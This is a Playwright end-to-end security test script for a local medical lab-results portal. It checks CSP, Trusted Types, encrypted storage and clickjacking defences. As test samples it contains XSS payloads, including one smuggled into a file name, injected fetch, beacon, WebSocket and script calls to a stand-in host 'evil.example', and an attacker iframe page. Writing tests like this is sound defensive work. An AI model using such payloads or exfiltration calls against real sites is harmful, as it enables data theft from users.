#!/usr/bin/env node
// Browser security tests against the real built page (dist/index.html, opened
// from file:// like a user would). Run after `npm run build`:
//   node e2e/security.e2e.mjs
// Needs Playwright with Chromium (CI installs it; see the workflow).
import { mkdtempSync, rmSync, writeFileSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createServer } from "node:http";
import * as XLSX from "xlsx";
import { headerProblems } from "../scripts/check-headers.mjs";

const require = createRequire(import.meta.url);
const { chromium } = require("playwright");

const root = fileURLToPath(new URL("..", import.meta.url));
const APP = `file://${join(root, "dist/index.html")}`;
const FIX = (f) => join(root, "fixtures", f);
const PASS = "correct horse battery";

const results = [];
const check = (name, ok, detail = "") => results.push({ name, ok: !!ok, detail });

const tmp = mkdtempSync(join(tmpdir(), "portal-e2e-"));
const context = await chromium.launchPersistentContext(join(tmp, "profile"), { locale: "en-GB" });

/** A page with recorders for everything that could indicate a leak. */
async function watchedPage() {
  const page = await context.newPage();
  const rec = { violations: [], errors: [], requests: [], responses: [], dialogs: [] };
  page.on("console", (m) => {
    const t = m.text();
    if (/Content.Security|Trusted Type|Refused to/i.test(t)) rec.violations.push(t.slice(0, 160));
    else if (m.type() === "error") rec.errors.push(t.slice(0, 160));
  });
  page.on("pageerror", (e) => rec.errors.push(String(e).slice(0, 160)));
  page.on("request", (r) => !/^(file|data|blob):/.test(r.url()) && rec.requests.push(r.url()));
  page.on("response", (r) => !/^(file|data|blob):/.test(r.url()) && rec.responses.push(r.url()));
  page.on("dialog", (d) => {
    rec.dialogs.push(d.message());
    void d.dismiss();
  });
  await page.goto(APP);
  return { page, rec };
}

const loaded = (page) =>
  page.getByRole("button", { name: /^Report$|Doctor report/ }).first().waitFor({ timeout: 10_000 }).then(
    () => true,
    () => false,
  );
const xss = (page) => page.evaluate(() => window.__xss ?? null);
const newFile = (page) => page.getByRole("button", { name: /New file/ }).click();

try {
  // 1. Normal use: every format loads, and nothing is blocked, failing or sent.
  {
    const { page, rec } = await watchedPage();
    for (const f of ["sample_lab_results.xlsx", "realistic_lab_results.xlsx", "realistic_blood_cp1251.csv", "realistic_urine.numbers"]) {
      await page.setInputFiles("#file-input", FIX(f));
      const ok = await loaded(page);
      if (ok) {
        await page.locator("main button[aria-expanded]").nth(1).click();
        await page.getByRole("button", { name: /^Report$/ }).first().click();
        await page.getByRole("button", { name: /Back to dashboard/ }).click();
        await newFile(page);
      }
      check(`loads ${f}`, ok);
    }
    check("normal use: no CSP/Trusted Types violations", rec.violations.length === 0, rec.violations.join(" | "));
    check("normal use: no errors", rec.errors.length === 0, rec.errors.join(" | "));
    check("normal use: no network requests", rec.requests.length === 0, rec.requests.join(" "));
    await page.close();
  }

  // 2. Hostile files: nothing executes, nothing is requested, payloads show as text.
  {
    const { page, rec } = await watchedPage();
    const hostileName = `<img src=x onerror="window.__xss=11">.xlsx`;
    const files = [
      FIX("hostile_markup.xlsx"),
      FIX("hostile_html.xls"),
      { name: hostileName, mimeType: "application/octet-stream", buffer: readFileSync(FIX("hostile_markup.xlsx")) },
    ];
    for (const f of files) {
      const label = typeof f === "string" ? f.split("/").pop() : "hostile file name";
      await page.setInputFiles("#file-input", f);
      const ok = await loaded(page);
      if (ok) {
        for (const b of await page.locator("main button[aria-expanded=false]").all()) await b.click().catch(() => {});
        await page.mouse.move(200, 300);
        await page.getByRole("button", { name: /^Report$/ }).first().click();
        await page.waitForTimeout(200);
        await page.getByRole("button", { name: /Back to dashboard/ }).click();
      }
      check(`hostile: ${label} handled`, ok);
      if (ok) await newFile(page);
    }
    await page.setInputFiles("#file-input", FIX("hostile_markup.xlsx"));
    await loaded(page);
    const text = await page.locator("body").innerText();
    check("hostile: markup is shown as text", text.includes("<img src=x onerror="), "payload text not found");
    await page.waitForTimeout(500);
    check("hostile: no payload executed", (await xss(page)) === null && rec.dialogs.length === 0, `__xss=${await xss(page)}`);
    check("hostile: no network requests", rec.requests.length === 0, rec.requests.join(" "));
    await page.close();
  }

  // 3. An oversized file is refused (generated here to keep the repo small).
  {
    const { page } = await watchedPage();
    const rows = [["Marker EN", "Reference", "2025-01-01"], ...Array.from({ length: 6_000 }, (_, i) => [`M${i}`, "<1", 0.5])];
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), "Blood");
    await page.setInputFiles("#file-input", {
      name: "too_many_rows.xlsx",
      mimeType: "application/octet-stream",
      buffer: XLSX.write(wb, { type: "buffer", bookType: "xlsx" }),
    });
    const alert = await page.getByRole("alert").innerText({ timeout: 15_000 }).catch(() => "");
    check("oversized file is refused", /too big/i.test(alert), alert);
    await page.close();
  }

  // 4–5. Code running in the page can't send data out, inject HTML, or eval.
  {
    const { page, rec } = await watchedPage();
    await page.evaluate(() => {
      window.__v = [];
      window.addEventListener("securitypolicyviolation", (e) => window.__v.push(`${e.violatedDirective} ${e.blockedURI}`));
      // Scheduled so it runs from the page's own event loop (DevTools evaluation is exempt from some checks).
      setTimeout(async () => {
        const r = {};
        try { await fetch("https://evil.example/f"); r.fetch = "sent"; } catch { r.fetch = "blocked"; }
        navigator.sendBeacon("https://evil.example/b", "data");
        const img = new Image(); img.src = "https://evil.example/i.gif";
        try { new WebSocket("wss://evil.example/w"); } catch { /* blocked */ }
        try { document.body.insertAdjacentHTML("beforeend", "<img src=x onerror='window.__xss=1'>"); r.html = "inserted"; } catch { r.html = "blocked"; }
        try { eval("1"); r.eval = "ran"; } catch { r.eval = "blocked"; }
        try { const s = document.createElement("script"); s.src = "https://evil.example/s.js"; document.head.append(s); r.script = "added"; } catch { r.script = "blocked"; }
        window.__attacks = r;
      }, 0);
    });
    await page.waitForTimeout(1_000);
    const r = await page.evaluate(() => window.__attacks);
    const v = await page.evaluate(() => window.__v);
    // Each attempt must be stopped by the CSP itself (a network failure alone doesn't count).
    const blockedBy = (dir, url) => v.some((x) => x.startsWith(dir) && x.includes(url));
    check("injected fetch is blocked by CSP", r?.fetch === "blocked" && blockedBy("connect-src", "evil.example/f"), v.join(","));
    check("injected HTML is blocked (Trusted Types)", r?.html === "blocked");
    check("eval is blocked", r?.eval === "blocked");
    check("sendBeacon is blocked by CSP", blockedBy("connect-src", "evil.example/b"), v.join(","));
    check("image beacon is blocked by CSP", blockedBy("img-src", "evil.example/i.gif"), v.join(","));
    check("WebSocket is blocked by CSP", blockedBy("connect-src", "evil.example/w"), v.join(","));
    check("external script is blocked by CSP", blockedBy("script-src", "evil.example/s.js") || r?.script === "blocked", v.join(","));
    check("nothing reached the network", rec.responses.length === 0, rec.responses.join(" "));
    await page.close();
  }

  // 6. Encrypted "remember": another local page sees only ciphertext.
  {
    const { page } = await watchedPage();
    await page.getByRole("checkbox", { name: /Remember my last file/ }).check();
    await page.getByLabel("Passphrase", { exact: true }).fill(PASS);
    await page.getByLabel("Repeat passphrase").fill(PASS);
    await page.getByRole("button", { name: "Turn on" }).click();
    await page.getByText(/saved encrypted/).waitFor({ timeout: 15_000 });
    await page.setInputFiles("#file-input", FIX("realistic_lab_results.xlsx"));
    await loaded(page);
    await page.waitForTimeout(1_000);

    const otherHtml = join(tmp, "other-page.html");
    writeFileSync(
      otherHtml,
      `<!doctype html><script>window.peek=()=>new Promise(res=>{const r=indexedDB.open("medical-portal",1);
r.onupgradeneeded=()=>r.result.createObjectStore("files");r.onsuccess=()=>{const g=r.result.transaction("files").objectStore("files").get("last");
g.onsuccess=()=>{const v=g.result;res(v?{keys:Object.keys(v).sort(),ct:v.ct?Array.from(new Uint8Array(v.ct)):[]}:null)}}})</script>`,
    );
    const other = await context.newPage();
    await other.goto(`file://${otherHtml}`);
    const seen = await other.evaluate(() => window.peek());
    check("another local page can find the record", !!seen, "nothing stored?");
    // Look for sequences that can't occur in random ciphertext by chance: the
    // file's first 32 bytes (zip header + first entry name) and its full name.
    // (Short patterns like "PK" do appear in random bytes now and then.)
    const ct = Buffer.from(seen?.ct ?? []);
    const original = readFileSync(FIX("realistic_lab_results.xlsx"));
    const leaks = [
      ["file header", original.subarray(0, 32)],
      ["file name", Buffer.from("realistic_lab_results.xlsx")],
    ].filter(([, needle]) => ct.includes(needle));
    check(
      "…but only ciphertext: no name, no bytes",
      seen && seen.keys.join(",") === "ct,iterations,iv,kdf,salt,v" && ct.length > original.length && leaks.length === 0,
      `${JSON.stringify(seen?.keys)} leaks: ${leaks.map(([n]) => n).join(", ") || "none"}`,
    );
    await other.close();

    await page.reload();
    await page.getByLabel("Passphrase", { exact: true }).fill("not the passphrase");
    await page.getByRole("button", { name: "Open saved file" }).click();
    check("wrong passphrase is refused", /Wrong passphrase/.test(await page.getByRole("alert").innerText()));
    await page.getByLabel("Passphrase", { exact: true }).fill(PASS);
    await page.getByRole("button", { name: "Open saved file" }).click();
    check("right passphrase reopens the file", await loaded(page));
    await page.close();
  }
  // 7. Hosted over HTTP: generated headers, and clickjacking protection with and without them.
  {
    const page0 = readFileSync(join(root, "dist/index.html"));
    const hostHeaders = Object.fromEntries(
      [...readFileSync(join(root, "dist/_headers"), "utf8").matchAll(/^\s+([\w-]+):\s*(.+)$/gm)].map((m) => [m[1], m[2]]),
    );
    const html = { "Content-Type": "text/html; charset=utf-8" };
    const server = createServer((req, res) => {
      const port = server.address().port;
      if (req.url === "/") res.writeHead(200, { ...html, ...hostHeaders }).end(page0); // a host applying _headers
      else if (req.url === "/bare/") res.writeHead(200, html).end(page0); // a host that can't set headers
      else if (req.url === "/frame" || req.url === "/frame-bare") {
        // The attacker's page, on another origin (localhost vs 127.0.0.1), embeds the portal.
        const target = `http://127.0.0.1:${port}${req.url === "/frame" ? "/" : "/bare/"}`;
        res.writeHead(200, html).end(`<!doctype html><iframe src="${target}" width="900" height="700"></iframe>`);
      } else res.writeHead(404).end();
    });
    await new Promise((r) => server.listen(0, "127.0.0.1", r));
    const port = server.address().port;
    const app = `http://127.0.0.1:${port}`;
    try {
      const good = await fetch(`${app}/`);
      const goodProblems = headerProblems(good.headers, await good.text(), { https: false });
      check("hosted: generated headers pass check-headers", goodProblems.length === 0, goodProblems.join("; "));
      const bare = await fetch(`${app}/bare/`);
      check("hosted: check-headers flags a host without headers", headerProblems(bare.headers, await bare.text(), { https: false }).length >= 5);

      // The app works under the header CSP too (worker, charts, report).
      const page = await context.newPage();
      const rec = { violations: [], errors: [], requests: [] };
      page.on("console", (m) => {
        if (/Content.Security|Trusted Type|Refused to|Permissions-Policy/i.test(m.text())) rec.violations.push(m.text().slice(0, 140));
        else if (m.type() === "error") rec.errors.push(m.text().slice(0, 140));
      });
      page.on("pageerror", (e) => rec.errors.push(String(e).slice(0, 140)));
      page.on("request", (r) => !r.url().startsWith(app) && !/^(data|blob):/.test(r.url()) && rec.requests.push(r.url()));
      await page.goto(`${app}/`);
      await page.setInputFiles("#file-input", FIX("realistic_lab_results.xlsx"));
      const ok = await loaded(page);
      if (ok) {
        await page.locator("main button[aria-expanded]").nth(1).click();
        await page.getByRole("button", { name: /^Report$/ }).first().click();
      }
      check("hosted: app works over HTTP with the headers", ok);
      check("hosted: no violations, errors or outside requests", !rec.violations.length && !rec.errors.length && !rec.requests.length, [...rec.violations, ...rec.errors, ...rec.requests].join(" | "));
      await page.close();

      // Clickjacking: with headers the browser refuses to frame the page…
      const attacker = await context.newPage();
      await attacker.goto(`http://localhost:${port}/frame`);
      await attacker.waitForTimeout(800);
      const framed = attacker.frames().find((f) => f !== attacker.mainFrame());
      const rendered = framed ? await framed.evaluate(() => !!document.getElementById("root")).catch(() => false) : false;
      check("hosted: framing is refused (frame-ancestors / X-Frame-Options)", !rendered);
      // …and without headers the frame guard hides it.
      await attacker.goto(`http://localhost:${port}/frame-bare`);
      await attacker.waitForTimeout(800);
      const bareFrame = attacker.frames().find((f) => f !== attacker.mainFrame());
      const display = bareFrame ? await bareFrame.evaluate(() => getComputedStyle(document.documentElement).display).catch((e) => `error ${e}`) : "no frame";
      check("headerless host: a framed copy shows nothing (frame guard)", display === "none", display);
      await attacker.close();
      const direct = await context.newPage();
      await direct.goto(`${app}/bare/`);
      check(
        "headerless host: opened directly, the page is visible",
        (await direct.evaluate(() => getComputedStyle(document.documentElement).display)) !== "none" && (await direct.locator("#file-input").count()) === 1,
      );
      await direct.close();
    } finally {
      server.close();
    }
  }
} finally {
  await context.close();
  rmSync(tmp, { recursive: true, force: true });
}

const failed = results.filter((r) => !r.ok);
for (const r of results) console.log(`${r.ok ? "✓" : "✗"} ${r.name}${!r.ok && r.detail ? ` — ${r.detail}` : ""}`);
console.log(`\n${results.length - failed.length}/${results.length} security checks passed`);
process.exit(failed.length ? 1 : 0);
